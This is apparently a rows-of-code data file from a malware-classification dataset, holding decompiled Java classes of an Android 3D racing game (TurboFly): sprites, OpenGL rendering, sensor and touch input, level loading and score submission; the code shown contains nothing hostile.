"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly\SplashScreen.code","public class SplashScreen extends Osaris2D3D {   static int state=2;   GLSurface GLSV;   long iniTime=0;   private Sprite screen;   int[] textures;   public SplashScreen(  boolean useTranslucentBackground,  GLSurface GLSV){     this.GLSV=GLSV;   }   @Override public void drawFrame(){     if (state == 2) {       initGL();       setMatrix2D();       this.screen.draw(0,0);       state=1;       return;     }     if (state == 1) {       state=3;       Text.reInit();       GLSurface.menu.surfaceCreated();       GLSurface.inGame.surfaceCreated();       return;     }     if (state == 3) {       long time=System.currentTimeMillis();       initGL();       setMatrix2D();       this.screen.draw(0,0);       if (time > this.iniTime + 3750 || ((!JumpyBall.COREAN && JumpyBall.PC) || GLSurface.state != 1)) {         state=0;         if (!JumpyBall.PC && GLSurface.state == 2) {           GLSurface.inGame.reLoadTrack();         }         if (GLSurface.state == 1) {           GLSurface.state=3;         }         if (GLSurface.state == 3 || JumpyBall.PC) {           GLSurface.menu.load();           return;         }         return;       }       return;     }     if (GLSurface.state == 3) {       GLSurface.menu.drawFrame();     }  else     if (GLSurface.state == 2) {       GLSurface.inGame.drawFrame();     }   }   @Override public int getState(){     return state;   }   @Override public void surfaceCreated(){     super.surfaceCreated();     VaisseauFactory.heyItsOkayImAlreadyInitializedYeahYeahJustDoNothingItWillBeOkay=false;     state=2;     this.screen=new Sprite(JumpyBall.resX,JumpyBall.resY,""sp10242.png"");     this.iniTime=System.currentTimeMillis();   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly\Sprite.code","public class Sprite {   private static final int NUM_BUFFERS=1;   public static final boolean VBO=false;   private static final int VERTS=4;   public int fromX;   public int fromY;   private IntBuffer mFVertexBuffer;   public boolean moving;   private double speed;   public int state;   private double t;   public int texture;   public int toX;   public int toY;   private int vertex_object;   public int x;   public int y;   public void setPos(  int x,  int y){     this.x=x;     this.y=y;   }   public void animFromTo(  int fromX,  int fromY,  int toX,  int toY,  long time){     this.fromX=fromX;     this.fromY=fromY;     this.toX=toX;     this.toY=toY;     setPos(fromX,fromY);     this.speed=100.0f / ((float)time);     this.t=0.0d;     this.moving=true;   }   public void animTo(  int toX,  int toY,  long time){     animFromTo(this.x,this.y,toX,toY,time);   }   public void animOf(  int dx,  int dy,  long time){     if (this.moving) {       this.x=this.toX;       this.y=this.toY;     }     this.fromX=this.x;     this.fromY=this.y;     this.toX=this.fromX + dx;     this.toY=this.fromY + dy;     this.speed=100.0f / ((float)time);     this.t=0.0d;     this.moving=true;   }   public boolean animStep(  float delta){     if (this.moving) {       this.t=Math.min(this.t + (this.speed * delta),1.0d);       setPos(this.fromX + ((int)((this.toX - this.fromX) * this.t)),this.fromY + ((int)((this.toY - this.fromY) * this.t)));       if (this.t == 1.0d) {         this.moving=false;       }     }     return this.moving;   }   public void moveOf(  int x,  int y){     if (this.moving) {       this.t=1.0d;       setPos(this.toX,this.toY);       this.moving=false;     }     setPos(this.x + x,this.y + y);   }   public Sprite(  int w,  int h,  String file,  boolean transparent_){     this(w,h,file);   }   public Sprite(  int w,  int h,  String file){     this.t=1.0d;     this.speed=0.0d;     this.moving=false;     this.state=0;     this.texture=TextureUtil.loadTexture(file);     initVertex(w,h);   }   public Sprite(  int w,  int h,  int textureID,  boolean transparent_){     this.t=1.0d;     this.speed=0.0d;     this.moving=false;     this.state=0;     this.texture=textureID;     GLES10.glBindTexture(3553,this.texture);     initVertex(w,h);   }   public Sprite(  int w,  int h,  Bitmap bitmap,  boolean transparent_,  int x,  int y,  int sx,  int sy){     this.t=1.0d;     this.speed=0.0d;     this.moving=false;     this.state=0;     initVertex(w,h);     int[] textures=new int[1];     GLES10.glGenTextures(1,textures,0);     this.texture=textures[0];     GLES10.glBindTexture(3553,this.texture);     GLES10.glTexParameterf(3553,10241,9728.0f);     GLES10.glTexParameterf(3553,10240,9729.0f);     GLES10.glTexParameterf(3553,10241,9729.0f);     GLES10.glTexParameterf(3553,10242,33071.0f);     GLES10.glTexParameterf(3553,10243,33071.0f);     GLES10.glTexEnvf(8960,8704,8448.0f);     Bitmap bitmap2=Bitmap.createBitmap(bitmap,x,y,sx,sy);     bitmap2=bitmap2.getConfig() == null ? bitmap2.copy(Bitmap.Config.ARGB_8888,false) : bitmap2;     GLUtils.texImage2D(3553,0,bitmap2,0);     bitmap2.recycle();   }   public void destroy(){     int[] textures={this.texture};     GLES10.glDeleteTextures(1,textures,0);   }   public void initVertex(  int w,  int h){     int[] coords=new int[12];     coords[4]=h * 65536;     coords[6]=w * 65536;     coords[9]=w * 65536;     coords[10]=h * 65536;     ByteBuffer vbb=ByteBuffer.allocateDirect(48);     vbb.order(ByteOrder.nativeOrder());     this.mFVertexBuffer=vbb.asIntBuffer();     for (int i=0; i < 4; i++) {       for (int j=0; j < 3; j++) {         this.mFVertexBuffer.put(coords[(i * 3) + j]);       }     }     this.mFVertexBuffer.position(0);   }   public void draw(){     GLES10.glBindTexture(3553,this.texture);     GLES10.glVertexPointer(3,5132,0,this.mFVertexBuffer);     GLES10.glDrawArrays(5,0,4);   }   public void draw(  int x,  int y){     GLES10.glTranslatex(x * 65536,y * 65536,0);     draw();     GLES10.glTranslatex((-x) * 65536,(-y) * 65536,0);   }   public void draw(  float x,  float y){     draw((int)x,(int)y);   }   public void drawSprite(){     GLES10.glTranslatex(this.x * 65536,this.y * 65536,0);     draw();     GLES10.glTranslatex((-this.x) * 65536,(-this.y) * 65536,0);   }   public void drawAgain(){     GLES10.glTranslatex(this.x * 65536,this.y * 65536,0);     GLES10.glDrawArrays(5,0,4);     GLES10.glTranslatex((-this.x) * 65536,(-this.y) * 65536,0);   }   public void drawAgain(  int x,  int y){     GLES10.glTranslatex(x * 65536,y * 65536,0);     GLES10.glDrawArrays(5,0,4);     GLES10.glTranslatex((-x) * 65536,(-y) * 65536,0);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly\SpriteManager.code","public class SpriteManager {   private GL10 gl=this.gl;   private GL10 gl=this.gl;   private Hashtable sprites=new Hashtable();   private Hashtable textures=new Hashtable();   private Vector animatedSprites=new Vector();   public Sprite get(  String s){     return (Sprite)this.sprites.get(s);   }   public void drawSprite(  String s){     ((Sprite)this.sprites.get(s)).drawSprite();   }   public void drawAgain(  String s){     ((Sprite)this.sprites.get(s)).drawAgain();   }   public void draw(  String s){     ((Sprite)this.sprites.get(s)).draw();   }   public void draw(  String s,  int x,  int y){     ((Sprite)this.sprites.get(s)).draw(x,y);   }   public void put(  String s,  Sprite sp){     this.sprites.put(s,sp);   }   public void handleAnim(  Sprite sp){     this.animatedSprites.add(sp);   }   public void animStep(  float delta){     Iterator it=this.animatedSprites.iterator();     while (it.hasNext()) {       Object s=it.next();       ((Sprite)s).animStep(delta);     }   }   public Sprite create(  String s,  String RID,  int x,  int y,  int w,  int h,  boolean transparent,  boolean animated){     Sprite sp;     if (this.textures.containsKey(RID)) {       sp=new Sprite(w,h,((Integer)this.textures.get(RID)).intValue(),transparent);     }  else {       sp=new Sprite(w,h,RID,transparent);       this.textures.put(RID,Integer.valueOf(sp.texture));     }     put(s,sp);     sp.setPos(x,y);     if (animated) {       handleAnim(sp);     }     return sp;   }   public Sprite createET(  String s,  int textureID,  int x,  int y,  int w,  int h,  boolean transparent,  boolean animated){     Sprite sp=new Sprite(w,h,textureID,transparent);     put(s,sp);     sp.setPos(x,y);     if (animated) {       handleAnim(sp);     }     return sp;   }   public Sprite create(  String s,  String RID,  int w,  int h,  boolean transparent,  boolean animated){     return create(s,RID,0,0,w,h,transparent,animated);   }   public Sprite create(  String s,  String RID,  int w,  int h,  boolean transparent){     return create(s,RID,0,0,w,h,transparent,false);   }   public Sprite create(  String s,  String RID,  int w,  int h){     return create(s,RID,0,0,w,h,false,false);   }   public Sprite create(  String s,  String RID,  int x,  int y,  int w,  int h){     return create(s,RID,x,y,w,h,false,false);   }   public Sprite create(  String s,  String RID,  int x,  int y,  int w,  int h,  boolean transparent){     return create(s,RID,x,y,w,h,transparent,false);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly\string.code","public static final class string {   public static final int GLSurfaceViewS0=0x7f030066;   public static final int GLSurfaceViewS1=0x7f030067;   public static final int GLSurfaceViewS13=0x7f030068;   public static final int GLSurfaceViewS15=0x7f030069;   public static final int GLSurfaceViewS17=0x7f03006a;   public static final int GLSurfaceViewS2=0x7f03006b;   public static final int GLSurfaceViewS21=0x7f03006c;   public static final int GLSurfaceViewS22=0x7f03006d;   public static final int GLSurfaceViewS26=0x7f03006e;   public static final int GLSurfaceViewS28=0x7f03006f;   public static final int GLSurfaceViewS29=0x7f030070;   public static final int GLSurfaceViewS3=0x7f030071;   public static final int GLSurfaceViewS37=0x7f030072;   public static final int GLSurfaceViewS38=0x7f030073;   public static final int GLSurfaceViewS39=0x7f030074;   public static final int GLSurfaceViewS4=0x7f030075;   public static final int GLSurfaceViewS49=0x7f030076;   public static final int GLSurfaceViewS5=0x7f030077;   public static final int GLSurfaceViewS50=0x7f030078;   public static final int GLSurfaceViewS51=0x7f030079;   public static final int GLSurfaceViewS52=0x7f03007a;   public static final int GLSurfaceViewS53=0x7f03007b;   public static final int GLSurfaceViewS8=0x7f03007c;   public static final int InGameS10=0x7f030008;   public static final int InGameS11=0x7f030009;   public static final int InGameS2=0x7f03000a;   public static final int InGameS3=0x7f03000b;   public static final int InGameS4=0x7f03000c;   public static final int InGameS5=0x7f03000d;   public static final int InGameS54=0x7f03000e;   public static final int InGameS55=0x7f03000f;   public static final int InGameS57=0x7f030010;   public static final int InGameS6=0x7f030011;   public static final int InGameS7=0x7f030012;   public static final int InGameS8=0x7f030013;   public static final int InGameS9=0x7f030014;   public static final int InGameSPosition=0x7f030015;   public static final int InGameSSpeedUnit=0x7f030016;   public static final int MenuS0=0x7f030017;   public static final int MenuS1=0x7f030018;   public static final int MenuS104=0x7f030019;   public static final int MenuS105=0x7f03001a;   public static final int MenuS106=0x7f03001b;   public static final int MenuS107=0x7f03001c;   public static final int MenuS108=0x7f03001d;   public static final int MenuS109=0x7f03001e;   public static final int MenuS11=0x7f03001f;   public static final int MenuS110=0x7f030020;   public static final int MenuS114=0x7f030021;   public static final int MenuS115=0x7f030022;   public static final int MenuS118=0x7f030023;   public static final int MenuS134=0x7f030024;   public static final int MenuS135=0x7f030025;   public static final int MenuS136=0x7f030026;   public static final int MenuS137=0x7f030027;   public static final int MenuS138=0x7f030028;   public static final int MenuS139=0x7f030029;   public static final int MenuS140=0x7f03002a;   public static final int MenuS141=0x7f03002b;   public static final int MenuS142=0x7f03002c;   public static final int MenuS143=0x7f03002d;   public static final int MenuS144=0x7f03002e;   public static final int MenuS145=0x7f03002f;   public static final int MenuS153=0x7f030030;   public static final int MenuS154=0x7f030031;   public static final int MenuS155=0x7f030032;   public static final int MenuS156=0x7f030033;   public static final int MenuS158=0x7f030034;   public static final int MenuS159=0x7f030035;   public static final int MenuS160=0x7f030036;   public static final int MenuS161=0x7f030037;   public static final int MenuS162=0x7f030038;   public static final int MenuS163=0x7f030039;   public static final int MenuS164=0x7f03003a;   public static final int MenuS165=0x7f03003b;   public static final int MenuS166=0x7f03003c;   public static final int MenuS167=0x7f03003d;   public static final int MenuS168=0x7f03003e;   public static final int MenuS169=0x7f03003f;   public static final int MenuS170=0x7f030040;   public static final int MenuS171=0x7f030041;   public static final int MenuS172=0x7f030042;   public static final int MenuS181=0x7f030043;   public static final int MenuS2=0x7f030044;   public static final int MenuS20=0x7f030045;   public static final int MenuS21=0x7f030046;   public static final int MenuS22=0x7f030047;   public static final int MenuS3=0x7f030048;   public static final int MenuS35=0x7f030049;   public static final int MenuS4=0x7f030062;   public static final int MenuS52=0x7f03004a;   public static final int MenuS53=0x7f03004b;   public static final int MenuS54=0x7f03004c;   public static final int MenuS55=0x7f03004d;   public static final int MenuS58=0x7f03004e;   public static final int MenuS59=0x7f03004f;   public static final int MenuS60=0x7f030050;   public static final int MenuS61=0x7f030051;   public static final int MenuS62=0x7f030052;   public static final int MenuS63=0x7f030053;   public static final int MenuS64=0x7f030054;   public static final int MenuS65=0x7f030055;   public static final int MenuS66=0x7f030056;   public static final int MenuS67=0x7f030057;   public static final int MenuS7=0x7f030058;   public static final int MenuS74=0x7f030059;   public static final int MenuS75=0x7f03005a;   public static final int MenuS76=0x7f03005b;   public static final int MenuS77=0x7f03005c;   public static final int MenuS79=0x7f03005d;   public static final int MenuS80=0x7f03005e;   public static final int MenuS81=0x7f03005f;   public static final int MenuS85=0x7f030060;   public static final int MenuS86=0x7f030061;   public static final int MenuS94=0x7f030063;   public static final int MenuS95=0x7f030064;   public static final int MenuS96=0x7f030065;   public static final int app_name=0x7f030000;   public static final int menu_easy=0x7f030005;   public static final int menu_hard=0x7f030007;   public static final int menu_medium=0x7f030006;   public static final int menu_pause=0x7f030003;   public static final int menu_resume=0x7f030004;   public static final int menu_start=0x7f030001;   public static final int menu_stop=0x7f030002; } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly\Tableaux.code","public class Tableaux {   public static final float[][] defaultParams;   public static final float[] blue1={0.6f,0.6f,0.6f,1.0f};   public static final float[] blue2={0.99215686f,0.60784316f,0.34509805f,1.0f};   public static final float[] blue={0.42352942f,0.47843137f,0.60784316f,1.0f};   public static final float[] blue3={0.0f,0.0f,0.0f,1.0f};   public static final String[][] texturess={new String[]{""f1sh.png"",""fighter_1.jpg"",""eau2.png""},new String[]{""color_5sh.png"",""color_5.jpg"",""eau2.png""},new String[]{""ship3sh.png"",""fighter_2.jpg"",""eau2.png""},new String[]{""orangesh.png"",""orange2.jpg"",""eau2.png""},new String[]{""color_f2sh.png"",""color_f2.jpg"",""eau2.png""},new String[]{""orangesh.png"",""mort.png"",""flash2.png""},new String[]{""ship4sh.png"",""mort.png"",""red.png""}};   public static final float[] baseYAngle={0.0f,0.0f,-2.0f,-10.0f,0.0f,0.0f,0.0f}; static {     float[][] fArr=new float[7];     float[] fArr2=new float[5];     fArr2[0]=6.5f;     fArr2[1]=0.17f;     fArr2[2]=0.0f;     fArr2[3]=JumpyBall.essai ? 1.6f : 1.6f;     fArr2[4]=0.12f;     fArr[0]=fArr2;     float[] fArr3=new float[5];     fArr3[0]=6.5f;     fArr3[1]=0.18f;     fArr3[2]=0.0f;     fArr3[3]=JumpyBall.essai ? 1.6f : 1.7f;     fArr3[4]=0.15f;     fArr[1]=fArr3;     fArr[2]=new float[]{6.4f,0.19f,0.0f,1.8f,0.13f};     fArr[3]=new float[]{6.0f,0.18f,0.0f,1.9f,0.16f};     fArr[4]=new float[]{6.0f,0.19f,0.0f,2.0f,0.18f};     fArr[5]=new float[]{6.0f,100.22f,0.0f,3.5f,0.3f};     fArr[6]=new float[]{6.0f,0.0f,0.0f,3.5f,0.3f};     defaultParams=fArr;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly.glsurface\GLSurface.code","public class GLSurface extends GLSurfaceView implements SurfaceHolder.Callback, SensorEventListener {   public static final int GAME=2;   public static final int MENU=3;   public static final int SPLASH_SCREEN=1;   public static int defOrientation;   public Activity context;   private float lastZ_raw1;   private float lastZ_raw2;   public static int state=1;   public static InGame inGame=null;   public static Menu menu=null;   public void initSplash(){     setRenderer(new SplashScreen(false,this));   }   public GLSurface(  Activity context,  int width,  int height){     super(context);     setEGLConfigChooser(8,8,8,8,16,0);     getHolder().setFormat(1);     this.context=context;     Osaris2D3D.width=width;     Osaris2D3D.height=height;     setKeepScreenOn(true);   }   @Override public void onSensorChanged(  SensorEvent sensorEvent){ synchronized (this) {       int sensor=sensorEvent.sensor.getType();       if (sensor == 1) {         float Ax=sensorEvent.values[0];         float Ay=sensorEvent.values[1];         float Az=sensorEvent.values[2];         if (defOrientation != 1) {           Ax=sensorEvent.values[1];           Ay=-sensorEvent.values[0];         }         float vz=(float)Math.toDegrees(Math.asin((-Ay) / ((float)Math.sqrt(((Ax * Ax) + (Ay * Ay)) + (Az * Az)))));         if (vz > 90.0f) {           vz=180.0f - vz;         }         if (vz < -90.0f) {           vz=(-180.0f) - vz;         }         this.lastZ_raw2=this.lastZ_raw1;         this.lastZ_raw1=vz;         if (Math.abs(vz - this.lastZ_raw2) < 1.5d) {           vz=(this.lastZ_raw2 + this.lastZ_raw1) * 0.5f;         }         if (InGame.controlMode == 0) {           InGame.lastZ=(-vz) * 1.5f;         }         if (InGame.controlMode == -1) {           InGame.lastZ=vz * 1.5f;         }       }     }   }   @Override public boolean onKeyDown(  int keyCode,  KeyEvent msg){     if (state == 3) {       return menu.doKeyDown(keyCode,msg,this.context);     }     if (state == 2 && ((inGame.getState() == 2 || inGame.getState() == 3) && (keyCode == 8 || ((!JumpyBall.KEYONLY && keyCode == 66) || (!JumpyBall.KEYONLY && keyCode == 23))))) {       doWinLose();     }     if (state == 2 && ((inGame.getState() == 5 || InGame.paused) && (keyCode == 8 || ((!JumpyBall.KEYONLY && keyCode == 66) || (!JumpyBall.KEYONLY && keyCode == 23))))) {       InGame.state=1;       InGame.paused=false;     }     if (state == 2 && InGame.state == 1 && InGame.controlMode == 2) {       if (keyCode == 21 || keyCode == 29 || keyCode == 45) {         InGame.lastZT=-35.0f;         return true;       }       if (keyCode == 22 || keyCode == 44 || keyCode == 32 || keyCode == 54 || keyCode == 51) {         InGame.lastZT=35.0f;         return true;       }       if ((!JumpyBall.KEYONLY && (keyCode == 62 || keyCode == 66 || keyCode == 10 || keyCode == 23)) || keyCode == 8) {         InGame.player.launchWeapon();         return true;       }     }     if (keyCode != 3 && ((!JumpyBall.KEYONLY && (keyCode == 4 || (keyCode == 82 && state == 2))) || keyCode == 9 || keyCode == 66)) {       if (state == 2 && (inGame.getState() == 2 || inGame.getState() == 3)) {         doWinLose();       }  else       if (state == 2) {         if (InGame.paused) {           InGame.paused=false;           if (menu == null) {             return true;           }           state=3;           menu.load();           return true;         }         if (state == 2) {           inGame.getState();         }         InGame.paused=true;         if (!JumpyBall.KEYONLY) {           new AlertDialog.Builder(this.context).setMessage(Messages.getString(R.string.GLSurfaceViewS3)).setNegativeButton(Messages.getString(R.string.GLSurfaceViewS4),new DialogInterface.OnClickListener(){             @Override public void onClick(            DialogInterface c,            int e){               if (GLSurface.state == 2 && GLSurface.inGame.getState() == 5) {                 InGame.state=1;               }               InGame.paused=false;             }           } ).setPositiveButton(Messages.getString(R.string.GLSurfaceViewS5),new DialogInterface.OnClickListener(){             @Override public void onClick(            DialogInterface c,            int e){               InGame.paused=false;               if (GLSurface.menu != null) {                 GLSurface.state=3;                 GLSurface.menu.load();               }             }           } ).show();         }       }     }     return false;   }   @Override public boolean onKeyUp(  int keyCode,  KeyEvent msg){     if (state != 2 || InGame.state != 1 || InGame.controlMode != 2) {       return false;     }     if ((keyCode == 21 || keyCode == 29 || keyCode == 45) && InGame.lastZT == -35.0f) {       InGame.lastZT=0.0f;       return true;     }     if ((keyCode != 22 && keyCode != 44 && keyCode != 32 && keyCode != 54 && keyCode != 51) || InGame.lastZT != 35.0f) {       return false;     }     InGame.lastZT=0.0f;     return true;   }   private void doTouchDown(  float x0,  float y0){     float x=(800.0f * x0) / Osaris2D3D.width;     float y=(480.0f * y0) / Osaris2D3D.height;     if (state == 3) {       menu.doTouchDown(x,y,this.context);     }  else     if (state == 2) {       inGame.doTouchDown(x,y,this.context);     }   }   void doTouchUp(  float x0,  float y0){     float x=(800.0f * x0) / Osaris2D3D.width;     float y=(480.0f * y0) / Osaris2D3D.height;     if (state == 3) {       menu.doTouchUp(x,y,this.context);       return;     }     if (state == 2) {       if (x > 704.0f && y < 96.0f && JumpyBall.blackberry) {         onKeyDown(4,null);       }  else       if (inGame.getState() == 2 || inGame.getState() == 3) {         doWinLose();       }  else {         inGame.doTouchUp(x,y,this.context);       }     }   }   @Override public boolean onTouchEvent(  MotionEvent event){     int action=event.getAction();     if (action == 0) {       doTouchDown(event.getX(),event.getY());     }  else     if (action == 2) {       doTouchDown(event.getX(),event.getY());     }  else     if (action == 1) {       doTouchUp(event.getX(),event.getY());     }     return true;   }   void doWinLose(){     int track;     String l2;     int visedScore=0;     int score=0;     boolean canSubmit=false;     String l3="""";     if (Tracks.mode == 0) {       track=Tracks.lvlTrack[Tracks.currentLvl];       visedScore=Tracks.lvlScore[Tracks.currentLvl];       menu.setState(10);       if (Tracks.currentLvl == Tracks.nbUnlocked - 1 && Tracks.currentLvl != Tracks.nbLvls - 1 && ((Tracks.currentMode == 0 && InGame.pos <= visedScore) || ((Tracks.currentMode == 1 && InGame.state == 3) || (Tracks.currentMode == 2 && InGame.scoreInfini > visedScore)))) {         l3=Messages.getString(R.string.GLSurfaceViewS8);         Tracks.nbUnlocked=Math.min(Tracks.nbUnlocked + 1,Tracks.nbLvls);         Tracks.nbShipUnlocked=Math.max(Tracks.lvlBaseship[Tracks.nbUnlocked - 1] + 1,Tracks.nbShipUnlocked);         Tracks.nbTrackUnlocked=Math.max(Tracks.lvlTrack[Tracks.nbUnlocked - 1] + 1,Tracks.nbTrackUnlocked);         OsarisTools.setValue(""unlockedtracks"",Tracks.nbUnlocked);         OsarisTools.setValue(""unlockedships"",Tracks.nbShipUnlocked);         OsarisTools.setValue(""unlockedsolotracks"",Tracks.nbTrackUnlocked);       }     }  else {       track=Tracks.currentTrack;       if (Tracks.currentMode == 0) {         visedScore=3;       }  else       if (Tracks.currentMode == 1) {         visedScore=30;       }  else       if (Tracks.currentMode == 2) {         visedScore=0;       }       menu.setState(2);     }     String bs=String.valueOf(String.valueOf(String.valueOf(""best"") + track) + ""m"") + Tracks.currentMode;     String l1=Messages.getString(R.string.GLSurfaceViewS13);     int currentScore=OsarisTools.getIntValue(bs,-1);     if (Tracks.currentMode == 2) {       if (currentScore == -1 || currentScore < InGame.scoreInfini) {         l1=Messages.getString(R.string.GLSurfaceViewS15);         OsarisTools.setValue(bs,InGame.scoreInfini);       }     }  else     if (((Tracks.currentMode == 0 && InGame.pos <= visedScore) || (Tracks.currentMode == 1 && InGame.state == 3)) && (currentScore == -1 || currentScore > (Osaris2D3D.minute * 60) + Osaris2D3D.second)) {       l1=Messages.getString(R.string.GLSurfaceViewS15);       OsarisTools.setValue(bs,(Osaris2D3D.minute * 60) + Osaris2D3D.second);     }     if (Tracks.currentMode == 0 && InGame.pos == 1) {       String l22=Messages.getString(R.string.GLSurfaceViewS17);       if (Osaris2D3D.minute < 10) {         l22=String.valueOf(l22) + ""0"";       }       String l23=String.valueOf(String.valueOf(l22) + Osaris2D3D.minute) + "":"";       if (Osaris2D3D.second < 10) {         l23=String.valueOf(l23) + ""0"";       }       l2=String.valueOf(l23) + Osaris2D3D.second;       canSubmit=true;       score=(Osaris2D3D.minute * 60) + Osaris2D3D.second;     }  else     if (Tracks.currentMode == 0 && InGame.pos <= visedScore) {       l2=String.valueOf(Messages.getString(R.string.GLSurfaceViewS21)) + InGame.pos;     }  else     if (Tracks.currentMode == 1 && InGame.state == 3) {       String l24=Messages.getString(R.string.GLSurfaceViewS22);       if (Osaris2D3D.minute < 10) {         l24=String.valueOf(l24) + ""0"";       }       String l25=String.valueOf(String.valueOf(l24) + Osaris2D3D.minute) + "":"";       if (Osaris2D3D.second < 10) {         l25=String.valueOf(l25) + ""0"";       }       l2=String.valueOf(l25) + Osaris2D3D.second;       canSubmit=true;       score=(Osaris2D3D.minute * 60) + Osaris2D3D.second;     }  else     if (Tracks.currentMode == 1 || Tracks.currentMode == 0) {       l1=Messages.getString(R.string.GLSurfaceViewS28);       String l26=Messages.getString(R.string.GLSurfaceViewS22);       if (Osaris2D3D.minute < 10) {         l26=String.valueOf(l26) + ""0"";       }       String l27=String.valueOf(String.valueOf(l26) + Osaris2D3D.minute) + "":"";       if (Osaris2D3D.second < 10) {         l27=String.valueOf(l27) + ""0"";       }       l2=String.valueOf(l27) + Osaris2D3D.second;     }  else     if (Tracks.currentMode == 2 && InGame.scoreInfini > visedScore) {       l2=String.valueOf(Messages.getString(R.string.GLSurfaceViewS26)) + InGame.scoreInfini;       canSubmit=true;       score=InGame.scoreInfini;     }  else {       l1=Messages.getString(R.string.GLSurfaceViewS28);       l2=String.valueOf(Messages.getString(R.string.GLSurfaceViewS29)) + InGame.scoreInfini;     }     if (Tracks.mode == 0) {       menu.loadLevelInfo(Tracks.currentLvl);     }  else {       menu.loadLevelInfo(Tracks.currentTrack);     }     int score3=(score + 1759) * 29;     final int score2=score3 + (10000000 * (((score3 % 10000000) / 17) % 10));     final int userId=OsarisTools.getIntValue(""userid"",(int)(Math.random() * 1.0E7d));     OsarisTools.setValue(""userid"",userId);     if (canSubmit) {       new AlertDialog.Builder(this.context).setMessage(l1 + ""\n"" + l2+ ""\n""+ l3+ ""\n""+ Messages.getString(R.string.GLSurfaceViewS37)).setNegativeButton(Messages.getString(R.string.GLSurfaceViewS38),new DialogInterface.OnClickListener(){         @Override public void onClick(        DialogInterface c,        int e){           GLSurface.state=3;           GLSurface.menu.load();         }       } ).setPositiveButton(Messages.getString(R.string.GLSurfaceViewS39),new DialogInterface.OnClickListener(){         @Override public void onClick(        DialogInterface c,        int e){           Intent i=new Intent(""android.intent.action.VIEW"",Uri.parse(""http://www.turbofly3d.com/scores.php5?code="" + score2 + ""&p=TurboFly&userid=""+ userId+ ""&mode=""+ Tracks.currentMode+ ""&level=""+ Tracks.currentTrack+ ""&ship=""+ Tracks.currentBaseship));           GLSurface.this.context.startActivity(i);           GLSurface.state=3;         }       } ).show();     }  else {       state=3;       menu.load();       menu.show(new Dialog().setMessage(String.valueOf(l1) + ""\n"" + l2+ ""\n""+ l3).setNegativeButton(Messages.getString(R.string.GLSurfaceViewS49),Menu.state));     }     if (JumpyBall.essai) {       final Activity context1=this.context;       new AlertDialog.Builder(this.context).setMessage(String.valueOf(Messages.getString(R.string.GLSurfaceViewS50)) + Messages.getString(R.string.GLSurfaceViewS51)).setNegativeButton(Messages.getString(R.string.GLSurfaceViewS52),(DialogInterface.OnClickListener)null).setPositiveButton(Messages.getString(R.string.GLSurfaceViewS53),new DialogInterface.OnClickListener(){         @Override public void onClick(        DialogInterface c,        int e){           Intent i=new Intent(""android.intent.action.VIEW"",Uri.parse(JumpyBall.fullURL));           context1.startActivity(i);           OsarisTools.exit();         }       } ).show();     }   }   @Override public void onAccuracyChanged(  Sensor arg0,  int arg1){   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly.glsurface\Renderer.code","public abstract class Renderer implements GLSurfaceView.Renderer {   public static EGLConfig configSpec;   public abstract void drawFrame();   public abstract int getState();   public abstract void sizeChanged(  int i,  int i2);   public abstract void surfaceCreated();   @Override public void onDrawFrame(  GL10 gl){     drawFrame();   }   @Override public void onSurfaceChanged(  GL10 gl,  int width,  int height){     Log.w(getClass().getName(),""SurfaceChanged called"");     sizeChanged(width,height);   }   @Override public void onSurfaceCreated(  GL10 gl,  EGLConfig config){     Log.w(getClass().getName(),""surfaceCreated called"");     surfaceCreated();     configSpec=config;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly.levels\DecorsFactory.code","public class DecorsFactory {   public static void loadLevel(  int level){     if (level == 0 || level == 1) {       loadRoutes(level);       return;     }     if (level == 2) {       loadCiel(level);       return;     }     if (level == 3) {       loadVille(level);       return;     }     if (level == 4 || level == 7) {       loadDesert(level);     }  else     if (level == 5) {       loadJumpyBall(level);     }  else     if (level == 6) {       loadVille(level);     }   }   private static void loadRoutes(  int level){     int texture1=0;     int texture2=0;     if (level == 0) {       Level1.blue=Tableaux.blue1;     }  else {       Level1.blue=Tableaux.blue2;     }     Level1.init();     if (level == 0) {       texture1=TextureUtil.loadTexture(""piste0.png"");       texture2=texture1;     }  else     if (level == 1) {       texture2=TextureUtil.loadTexture(""piste0.png"");       texture1=TextureUtil.loadTexture(""piste1.png"");     }     Level1.l1piste1.setTexture(texture1);     Level1.l1piste1A.setTexture(texture1);     Level1.l1piste1A2.setTexture(texture1);     Level1.l1piste1A3.setTexture(texture1);     Level1.l1tunnelMiddle1.setTexture(texture2);     Level1.l1tunnelMiddle2.setTexture(texture2);     Level1.l1tunnelDebut.setTexture(texture2);     Level1.l1piste2.setTexture(texture1);     Level1.l1piste2M.setTexture(texture1);     Sequence.sequences=new Sequence[3];     Sequence.sequences[0]=new Sequence(20,Level1.l1piste1,10,40);     Sequence.sequences[0].types[1]=Level1.l1piste1A;     Sequence.sequences[0].types[2]=Level1.l1piste1A2;     Sequence.sequences[0].types[3]=Level1.l1piste1;     Sequence.sequences[0].types[4]=Level1.l1piste1A2;     Sequence.sequences[0].types[5]=Level1.l1piste1A;     Sequence.sequences[0].types[6]=Level1.l1piste1A3;     Sequence.sequences[0].types[7]=Level1.l1piste1;     Sequence.sequences[0].types[8]=Level1.l1piste1A2;     Sequence.sequences[0].types[9]=Level1.l1piste1A;     Sequence.sequences[0].types[10]=Level1.l1piste1A3;     Sequence.sequences[0].types[11]=Level1.l1piste1A2;     Sequence.sequences[0].types[12]=Level1.l1piste1A;     Sequence.sequences[0].types[13]=Level1.l1piste1;     Sequence.sequences[0].types[14]=Level1.l1piste1A3;     Sequence.sequences[0].types[15]=Level1.l1piste1A;     